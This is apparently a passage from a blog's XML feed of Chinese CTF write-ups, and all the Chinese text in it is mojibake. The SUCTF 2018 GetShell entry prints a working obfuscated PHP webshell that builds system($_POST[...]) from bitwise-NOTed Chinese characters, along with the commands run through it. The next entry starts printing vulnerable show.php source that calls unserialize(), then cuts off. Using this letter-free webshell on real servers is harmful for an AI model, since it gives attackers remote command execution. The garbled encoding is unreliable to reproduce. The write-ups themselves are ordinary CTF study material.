å¤©è¿ç»­ä¸‹ç€æš´é›ªï¼Œè·¯ä¸Šçš„ç§¯é›ªä¸€è¸©åŠæ­¥æ·±ï¼Œå’¯å±å’¯å±å“ï¼Œå‘¨é­å´é™çš„åƒæ·±å±±é‡Œçš„å¤åˆ¹ã€‚æˆ‘ä½çš„å°åŒºç¦»å…¬å¸æœ‰ä¸€æ®µè·ç¦»ï¼Œæ‰ä¸‹é›ªçš„é‚£å¤©æˆ‘ç”šè‡³è¿˜èµ°ç€å›å®¶ã€‚åŒ—äº¬çš„å†¬å¤©æœ€å¯æ€•çš„æ˜¯å¯’é£ï¼Œèµ°åˆ°å®¶é‡Œè€³æœµå·²ç»ç¡¬é‚¦é‚¦å¥½åƒä¸€ç¢°å°±ä¼šç¢ï¼Œåœ¨æˆ‘ä¸€å¤´æ‰è¿›è¢«çªé‡Œçš„æ—¶å€™ï¼Œæˆ‘å´æ…¢æ…¢å–œæ¬¢ä¸Šè¿™ä¸ªå¤éƒ½äº†ã€‚æˆ‘æƒ³åˆ°ã€Šé›æ­£çš‡å¸ã€‹é‡Œèƒ¤ç¦›åœ¨åŒ—äº¬çš„é¹…æ¯›å¤§é›ªé‡Œæ”¾å‡ºåä¸‰çˆ·ï¼Œé‚£ä¸ªæ‹¼å‘½åä¸‰éƒå¸¦ç€ä»¤ç‰Œå–ä¸‹ä¸°å°å¤§è¥çš„å…µæƒï¼Œä¿äº†å¤§æ¸…æ±Ÿå±±ç››ä¸–çš„å»¶ç»­ä¸ç¨³å›ºã€‚é‚£ä¸€å¤œï¼ŒåŒ—äº¬çš„æ¼«å¤©å¤§é›ªç»ä¸é€Šäºä»Šæ—¥ï¼Œè€Œæ˜”äººå·²ä½œå¤ï¼Œæ¥è€…å°šä¸èƒ½åŠï¼Œå¤šä¹ˆæ‚²å“€ã€‚è¿™ä¸ªå¤éƒ½æ‰¿è½½ç€å¤ªå¤šå†å²çš„åšé‡æ„Ÿï¼Œç‰¹åˆ«æ˜¯ä¸‹é›ªçš„å­£èŠ‚ï¼Œæˆ‘å¯ä»¥æƒ³åˆ°ä¹¾æ¸…å®«å‰å¹¿åœºä¸Šåƒç™¾å¹´å¯‚å¯çš„é›•é¾™ä¸é“œé¾Ÿï¼Œå±‹æªä¸Šçš„ç§¯é›ªï¼Œé«˜é«˜åœ¨ä¸Šçš„é¸±å»ï¼Œæƒ³åˆ°æ•°ç™¾å¹´çš„æ²§æ¡‘ä¸æœä»£æ›´è¿­ã€‚é›ªåœçš„é‚£å¤©æˆ‘å»äº†é¢å’Œå›­ï¼Œæˆ‘è®°å¾—æˆ‘ç­‰äº†å¾ˆä¹…æ‰æ‘‡æ‘‡æ‘†æ‘†æ¥äº†ä¸€è¾†å…¬äº¤è½¦ï¼Œè½¦ä¸Šå‡ ä¹æ²¡æœ‰äººï¼Œå¸æœºå°å¿ƒç¿¼ç¿¼åœ°è½¬åŠ¨ç€æ–¹å‘ç›˜ï¼Œåœ¨æ¹¿æ»‘çš„é“è·¯ä¸Šç¼“æ…¢å‰è¡Œã€‚çª—å¤–ç™½èŒ«èŒ«ä¸€ç‰‡ï¼Œé˜³å…‰ç…§åœ¨é›ªåœ°ä¸Šæœ‰äº›åˆºçœ¼ï¼Œæˆ‘æ‰ä½ä¸‹å¤´ã€‚é¢å’Œå›­çš„å­¦ç”Ÿç¥¨ç”šè‡³æ¯”åœ°é“ç¥¨è¿˜ä¾¿å®œã€‚åœ¨æ˜†æ˜æ¹–ç•”çœºæœ›æ¹–é¢ï¼Œå¾®å¾®æ³›ç€å¤•é˜³éœå…‰çš„æ¹–æ°´å°šæœªç»“å†°ï¼Œè¸©ç€é‚£äº›å¯èƒ½è¢«å¾¡ç¢¾è½§è¿‡çš„åœŸåœ°ï¼Œæ»‘äº†æ— æ•°è·¤ï¼Œæœ€ååªèƒ½æ‰¶ç€æ¹–è¾¹çš„çŸ³ç‹®å­å¹æ°”ï¼Œä¸ºä»€ä¹ˆæ²¡ç©¿é˜²æ»‘çš„é‹å­ã€‚æ˜†æ˜æ¹–è¿™ä¸€æ±ªæ¸…æ°´ï¼Œè§è¯äº†å…‰ç»ªçš‡å¸è¢«å›šç¦åè½½çš„è¹‰è·å²æœˆï¼Œè§è¯äº†é™å®‰å…ˆç”Ÿèª“ä¸ºå…ˆæœè€Œè‡ªæººï¼Œä¹Ÿè§è¯äº†å…±å’Œå›½ä»¥æ¥å›ºå®ˆä¸å¼€æ”¾çš„äº¤å ã€‚è¯´èµ·æ¥ï¼Œå®¶é‡Œæœ‰æœ¬å«çªè‘—çš„ã€Šäººé—´è¯è¯å…¸è¯„ã€‹ï¼Œæœ¬æƒ³ä¹°æ¥ç»ä»°ä¸€ä¸‹ç‹é™å®‰çš„è¿™ç¯‡å¤å…¸ç¾å­¦å·¨è‘—ï¼Œæ²¡æƒ³åˆ°å…¨ä¹¦å¤šæ˜¯ä»¥æ‰¹åˆ¤ä¸ºä¸»ã€‚æˆ‘è‡ªè¯©æƒ³å½“æ–‡äººçš„é»‘å®¢ï¼Œå…¶å®ä¹Ÿåªæ˜¯å˜´é‡Œè¯´è¯´ï¼ŒçœŸåˆ°è¯„è¯´æ–‡ç« æ˜¯éçš„æ—¶å€™ï¼Œæˆ‘å´å¼ å£æ— è¯ã€‚å€’æ˜¯èª“æ­»ä¸å»å‘ï¼Œè¿™ç‚¹ç¡®å®è®©æˆ‘æ— é™æ„Ÿæ…¨ï¼šä¸­å›½å£«å¤§å¤«çš„éª¨æ°”ï¼ŒçœŸçš„æ˜¯ä»å±ˆåŸæŠ•æ°´çš„é‚£ä¸€åˆ»å°±å¥ å®šä¸‹æ¥çš„ã€‚æœ‰å¥è¯è¯´ï¼Œå¤å¾€ä»Šæ¥ä¸­å›½ä¸‰å¤§å¤©æ‰æ­»äºæ°´ï¼Œå…¶ä¸€å±ˆåŸï¼Œå…¶äºŒæç™½ï¼Œå…¶ä¸‰ç‹å›½ç»´ã€‚å«çªå¯¹æ­¤è¯é¢‡æœ‰ä¸æœï¼Œä¸çº ç»“ç‹å›½ç»´æ˜¯å¦èƒ½å¤Ÿä¸å‰äºŒè€…ç›¸æå¹¶è®ºï¼Œæˆ‘å•å–œæ¬¢ä»–çš„ç›´ç™½ï¼Œèƒ½ç•…å¿«è¯„è¯´å¤ä»Šè¯è¯çš„äººï¼Œä¹Ÿè®¸æ— å‡ºå…¶å³äº†å§ã€‚äººè¨€å¯ç•ã€äººè¨€å¯ç•ï¼Œè¶Šåˆ°ç°ä»£è¶Šä¼šæ·±æ·±æ„Ÿè§‰åˆ°è¿™å¥è¯çš„æ­£ç¡®ï¼Œçœ‹åˆ°å¾ˆå¤šäº‹æƒ…çš„å‘å±•å¾€å¾€è¢«èˆ†è®ºæ‰€å·¦å³ï¼Œå°±è¶Šç¾¡æ…•é‚£äº›æ— æ‰€ç•æƒ§çš„äººï¼Œä¸è®ºä»–ä»¬æ˜¯å‹‡æ•¢è¿˜æ˜¯è‡ªè´Ÿã€‚æ­¤é—´äººç‹å ç®—ä¸€ä¸ªï¼Œç½‘ç»œä¸Šäººä»¬å¯¹ä»–æ¯èª‰å‚åŠï¼Œä½†ç¡®å®æœ‰æœ¬äº‹è€Œåˆä¸çŸ«æ‰åšä½œï¼Œæ”¾èƒ†ç›´è¨€å¿ƒæ¯”å¤©é«˜çš„åªæœ‰ä»–ä¸€ä¸ªäº†ã€‚é‚£å¤©åœ¨æ˜†æ˜æ¹–ç•”çœ‹è¿‡å¤•é˜³ï¼Œç›´åˆ°å¤©ç©ºå˜çš„æ— æ¯”æ·±é‚ƒï¼Œæˆ‘æ‰æ…¢æ…¢å¾€å®¶çš„æ–¹å‘èµ°ã€‚è€³æœºæ”¾ç€åå¼¦çš„ã€Šæ˜†æ˜æ¹–ã€‹ï¼Œä¸çŸ¥ä¸è§‰å·²ç»åå¹´äº†ï¼Œä¸çŸ¥é“è¿™æ—¶å€™ä»–æœ‰æ²¡æœ‰å›é¦–æœ›æœ›è‡ªå·±çš„ä¹å…¬ä¸»å’Œå®‰å¨œï¼Œæ˜¯å¦è¿˜èƒ½å¤Ÿâ€œæ³¼å¢¨é€ ä¸€åŒ¹å¿«é©¬ï¼Œè¿½å›åå¹´å‰å§‘å¨˜â€ã€‚åæ¥ï¼Œæ„Ÿè§‰ä¸€åˆ‡éƒ½æ­¥å…¥æ­£è½¨ï¼Œå­¦ä½è¯ä¹Ÿé¡ºåˆ©æ‹¿åˆ°ï¼Œæˆ‘åŒ†åŒ†å‘Šåˆ«äº†è‡ªå·±çš„å¤§å­¦ã€‚åæ¥ä¹Ÿé‡åˆ°äº†å¾ˆå¤šäº‹ï¼Œäº‹åæœ‰äººæ‰¾æˆ‘ï¼Œå¾ˆå¤šäººå…³å¿ƒä½ ï¼Œå°‘æ•°äººå¯èƒ½ä¸æ˜¯ï¼Œä½†å‡ºäº†å­¦æ ¡ä»¥åï¼Œåˆæœ‰å¤šå°‘äººå’Œäº‹æƒ…å®Œå…¨æ²¡æœ‰ç›®çš„å‘¢ï¼Ÿæˆ‘ä¹Ÿè€ƒè™‘äº†å¾ˆå¤šå»å¤„ï¼Œä½†ä¸€ç›´æ²¡æœ‰å†³æ–­ï¼Œå€’æœ‰å¿µæ€€æ—§ä¸»ï¼Œä¹Ÿæœ‰å¦„è‡ªè²è–„ä¹‹æ„ï¼Œæˆ‘å¸Œæœ›è‡ªå·±èƒ½åšå‡ºç‚¹æˆç»©å†å»è°ˆå…¶ä»–çš„ï¼Œæ‰€ä»¥å¾ˆä¹…éƒ½æ˜¯é—­é—¨ä¸å‡ºï¼Œç¢ç£¨ä¸œè¥¿ã€‚æ¥åˆ°å¦é—¨ï¼Œæˆ‘è¿˜äº†ä¸€ä¸ªæ„¿ï¼Œåˆè®¸äº†æ–°çš„æ„¿æœ›ï¼Œå¸Œæœ›æˆ‘è¿˜ä¼šå†æ¬¡æ¥è¿˜æ„¿ã€‚æˆ‘åˆæ¥åˆ°äº†ä¸Šæ¬¡æ²¡ä½å¤Ÿçš„é¼“æµªå±¿ï¼Œè®¢äº†ä¸€é—´å®‰é™çš„æˆ¿å­ï¼Œåªæœ‰æˆ‘ä¸€ä¸ªäººã€‚åœ¨è¿™é‡Œï¼Œèƒ½å¬åˆ°çš„åªæœ‰è¿œå¤„å±‹æªä¸‹é¸Ÿå„¿å½å½å–³å–³çš„é¸£å«å£°ï¼Œè¿œå¤„çš„å–§åš£æ—©å·²çƒŸæ¶ˆäº‘æ•£ï¼Œå³ä½¿è¿™åªæ˜¯æš‚æ—¶çš„ã€‚ç«™åœ¨å±‹é¡¶çš„æˆ‘ï¼Œå–ä¸‹æ¯ä¸­æœ€åä¸€å£æ°´ã€‚æ¸…æ™¨ï¼ŒèƒŒç€è¡Œæï¼Œæˆ‘ä¹˜è½®æ¸¡ç¦»å¼€äº†é¼“æµªå±¿ï¼Œè¿™æ˜¯æˆ‘ç¬¬äºŒæ¬¡æ¥é¼“æµªå±¿ï¼Œè°çŸ¥é“ä¼šä¸ä¼šæ˜¯æœ€åä¸€æ¬¡ã€‚æˆ‘åœ¨è¿™é‡Œä½äº†ä¸‰å¤©ï¼Œç”¨ä¸‰å¤©å»å¯»æ‰¾äº†ä¸€ä¸ªç­”æ¡ˆã€‚ä¸çŸ¥ä¸è§‰æˆ‘åˆæƒ³åˆ°è¾œé¸¿é“­ä¸æ²ˆå­åŸ¹çš„é‚£æ®µå¯¹è¯ã€‚â€œå¤§éš¾ä¸´å¤´ï¼Œä½•ä»¥ä¸ºä¹‹ï¼Ÿâ€â€œä¸–å—å›½æ©ï¼Œæ­»ç”Ÿç³»ä¹‹ã€‚â€'</span><span class="token punctuation">;</span><span class="token keyword">for</span><span class="token punctuation">(</span><span class="token variable">$i</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$i</span><span class="token operator">&lt;</span><span class="token function">mb_strlen</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token variable">$st</span> <span class="token operator">=</span> <span class="token function">mb_substr</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">,</span> <span class="token variable">$i</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token operator">~</span><span class="token punctuation">(</span><span class="token variable">$st</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$b</span> <span class="token operator">=</span> <span class="token variable">$a</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token comment">#å–æ±‰å­—çš„ç¬¬ä¸€ä½</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$b</span><span class="token operator">==</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'a'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token comment">#$_GET['a']æƒ³è¦å¾—åˆ°çš„å­—ç¬¦</span><span class="token punctuation">&#123;</span><span class="token keyword">echo</span> <span class="token variable">$st</span><span class="token punctuation">;</span><span class="token keyword">exit</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ç¤ºä¾‹ï¼š</p><pre class="line-numbers language-none"><code class="language-none">&#x2F;&#x2F;$____&#x3D;1echo ~èŒ‰[$____];&#x2F;&#x2F;secho ~å†…[$____];&#x2F;&#x2F;yecho ~èŒ‰[$____];&#x2F;&#x2F;secho ~è‹[$____];&#x2F;&#x2F;techo ~çš„[$____];&#x2F;&#x2F;eecho ~å’©[$____];&#x2F;&#x2F;mecho ~è¯¾[$____];&#x2F;&#x2F;Pecho ~å°¬[$____];&#x2F;&#x2F;Oecho ~ç¬”[$____];&#x2F;&#x2F;Secho ~ç«¯[$____];&#x2F;&#x2F;Techo ~ç[$____];&#x2F;&#x2F;a<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?=</span><span class="token variable">$__</span><span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$____</span><span class="token operator">=</span><span class="token variable">$__</span><span class="token operator">==</span><span class="token variable">$__</span><span class="token punctuation">;</span><span class="token comment">#1</span><span class="token variable">$_</span><span class="token operator">=</span><span class="token operator">~</span><span class="token punctuation">(</span>åŒ—<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token variable">$____</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$_</span><span class="token operator">.=</span><span class="token operator">~</span><span class="token punctuation">(</span>ç†™<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token variable">$____</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$_</span><span class="token operator">.=</span><span class="token operator">~</span><span class="token punctuation">(</span>åŒ—<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token variable">$____</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$_</span><span class="token operator">.=</span><span class="token operator">~</span><span class="token punctuation">(</span>æ‹¾<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token variable">$____</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$_</span><span class="token operator">.=</span><span class="token operator">~</span><span class="token punctuation">(</span>çš„<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token variable">$____</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$_</span><span class="token operator">.=</span><span class="token operator">~</span><span class="token punctuation">(</span>å’Œ<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token variable">$____</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token comment">#system</span><span class="token variable">$___</span><span class="token operator">=</span><span class="token operator">~</span><span class="token punctuation">(</span>æ ·<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token variable">$____</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$___</span><span class="token operator">.=</span><span class="token operator">~</span><span class="token punctuation">(</span>è¯´<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token variable">$____</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$___</span><span class="token operator">.=</span><span class="token operator">~</span><span class="token punctuation">(</span>å°<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token variable">$____</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$___</span><span class="token operator">.=</span><span class="token operator">~</span><span class="token punctuation">(</span>æ¬¡<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token variable">$____</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$___</span><span class="token operator">.=</span><span class="token operator">~</span><span class="token punctuation">(</span>ç«™<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token variable">$____</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$____</span><span class="token operator">=</span><span class="token operator">~</span><span class="token punctuation">(</span>ç°<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token variable">$____</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token comment">#_POST</span><span class="token variable">$_</span><span class="token punctuation">(</span><span class="token variable">$$___</span><span class="token punctuation">[</span><span class="token variable">$_</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">#system($_POST[system]);</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>payload</p><pre class="line-numbers language-none"><code class="language-none">&lt;?&#x3D;$_&#x3D;[];$__.&#x3D;$_;$____&#x3D;$_&#x3D;&#x3D;$_;$___&#x3D;~èŒ‰[$____];$___.&#x3D;~å†…[$____];$___.&#x3D;~èŒ‰[$____];$___.&#x3D;~è‹[$____];$___.&#x3D;~çš„[$____];$___.&#x3D;~å’©[$____];$_____&#x3D;_;$_____.&#x3D;~è¯¾[$____];$_____.&#x3D;~å°¬[$____];$_____.&#x3D;~ç¬”[$____];$_____.&#x3D;~ç«¯[$____];$__________&#x3D;$$_____;$___($__________[~ç[$____]]);<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">a&#x3D;ls &#x2F;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-SUCTF-2018-GetShell/image-20210814190038386.png"></p><p>ç™¾åº¦äº†ä¸‹è¯´ç¯å¢ƒæœ‰é—®é¢˜ï¼Œflagæ²¡å†™è¿›å»</p><p>ä¸è¿‡å†™åˆ°envé‡Œé¢äº†ï¼Œæ‰§è¡Œä¸‹</p><pre class="line-numbers language-none"><code class="language-none">a&#x3D;env<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-SUCTF-2018-GetShell/image-20210814190127237.png"></p><p>å°±æœ‰äº†ã€‚</p><p>è¿™é‡Œæ˜¯åˆ©ç”¨äº†**å˜é‡å‡½æ•°(variable-functions)**ï¼Œå¯ä»¥ç”¨systemï¼Œä½†ä¸èƒ½äºeval</p><blockquote><p>systemæ˜¯ä¸ªå‡½æ•°ã€‚å¯ä»¥åŠ¨æ€è°ƒç”¨ã€‚è€Œevalæ˜¯PHPè¯­æ³•çš„ä¸€éƒ¨åˆ†ã€‚å¹¶ä¸æ˜¯å‡½æ•°ã€‚ä¸èƒ½åŠ¨æ€è°ƒç”¨ã€‚ç±»ä¼¼çš„è¿˜æœ‰echoï¼Œprintï¼Œunset()ï¼Œisset()ï¼Œempty()ï¼Œincludeï¼Œrequireéƒ½æ˜¯PHPè¯­æ³•æ„é€ ä¸€éƒ¨åˆ†ã€‚</p></blockquote><h2 id="å¥‡æ–‡å…±èµ"><a href="#å¥‡æ–‡å…±èµ" class="headerlink" title="å¥‡æ–‡å…±èµ"></a>å¥‡æ–‡å…±èµ</h2><p><a href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html">ä¸€äº›ä¸åŒ…å«æ•°å­—å’Œå­—æ¯çš„webshell</a></p><p><a href="https://guokeya.github.io/post/suctf-2018getshellwu-shu-zi-zi-mu-webshell/">https://guokeya.github.io/post/suctf-2018getshellwu-shu-zi-zi-mu-webshell/</a></p>]]></content>
      
      
      <categories>
          
          <category> Web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>åˆ·é¢˜ç¬”è®°:[å®‰æ´µæ¯ 2019]ä¸æ˜¯æ–‡ä»¶ä¸Šä¼ </title>
      <link href="/p/893436503.html"/>
      <url>/p/893436503.html</url>
      
        <content type="html"><![CDATA[<h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-%E5%AE%89%E6%B4%B5%E6%9D%AF-2019-%E4%B8%8D%E6%98%AF%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20210814150054232.png"></p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-%E5%AE%89%E6%B4%B5%E6%9D%AF-2019-%E4%B8%8D%E6%98%AF%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20210814150302414.png"></p><h2 id="é¢˜è§£"><a href="#é¢˜è§£" class="headerlink" title="é¢˜è§£"></a>é¢˜è§£</h2><p>ä¸»é¡µæ³¨é‡Šï¼Œç¬¬ä¸€æ—¶é—´æƒ³åˆ°gitæ³„æ¼</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-%E5%AE%89%E6%B4%B5%E6%9D%AF-2019-%E4%B8%8D%E6%98%AF%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20210814150330358.png"></p><p>è¯•äº†ä¸‹ï¼Œæ²¡æœ‰</p><p>æ²¡æƒ³åˆ°ç«Ÿç„¶æ˜¯ä¸Šgithubæœè¿™ä¸ª</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-%E5%AE%89%E6%B4%B5%E6%9D%AF-2019-%E4%B8%8D%E6%98%AF%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20210814150557807.png"></p><h3 id="æºç "><a href="#æºç " class="headerlink" title="æºç "></a>æºç </h3><p>show.php</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"./helper.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$show</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">show</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"delete_all"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"delete_all"</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string double-quoted-string">"true"</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token variable">$show</span><span class="token operator">-></span><span class="token function">Delete_All_Images</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token variable">$show</span><span class="token operator">-></span><span class="token function">Get_All_Images</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">show</span><span class="token punctuation">&#123;</span><span class="token keyword">public</span> <span class="token variable">$con</span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">con</span> <span class="token operator">=</span> <span class="token function">mysqli_connect</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"127.0.0.1"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"root"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"root"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"pic_base"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">mysqli_connect_errno</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">con</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>   <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Connect MySQL Fail:"</span><span class="token operator">.</span><span class="token function">mysqli_connect_error</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">Get_All_Images</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"SELECT * FROM images"</span><span class="token punctuation">;</span><span class="token variable">$result</span> <span class="token operator">=</span> <span class="token function">mysqli_query</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">con</span><span class="token punctuation">,</span> <span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$result</span><span class="token operator">-></span><span class="token property">num_rows</span> <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">while</span><span class="token punctuation">(</span><span class="token variable">$row</span> <span class="token operator">=</span> <span class="token variable">$result</span><span class="token operator">-></span><span class="token function">fetch_assoc</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$row</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"attr"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$attr_temp</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'\0\0\0'</span><span class="token punctuation">,</span> <span class="token function">chr</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string single-quoted-string">'*'</span><span class="token operator">.</span><span class="token function">chr</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token variable">$row</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"attr"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$attr</span> <span class="token operator">=</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$attr_temp</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span>        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;p>id="</span><span class="token operator">.</span><span class="token variable">$row</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"id"</span><span class="token punctuation">]</span><span class="token operator">.</span><span class="token string double-quoted-string">" filename="</span><span class="token operator">.</span><span class="token variable">$row</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"filename"</span><span class="token punctuation">]</span><span class="token operator">.</span><span class="token string double-quoted-string">" path="</span><span class="token operator">.</span><span class="token variable">$row</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"path"</span><span class="token punctuation">]</span><span class="token operator">.</span><span class="token string double-quoted-string">"&lt;/p>"</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;p>You have not uploaded an image yet.&lt;/p>"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token function">mysqli_close</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">con</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">Delete_All_Images</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"DELETE FROM images"</span><span class="token punctuation">;</span><span class="token variable">$result</span> <span class="token operator">=</span> <span class="token function">mysqli_query</span><span class="token punctuation">(</span><span class="token variable">$this</span><span 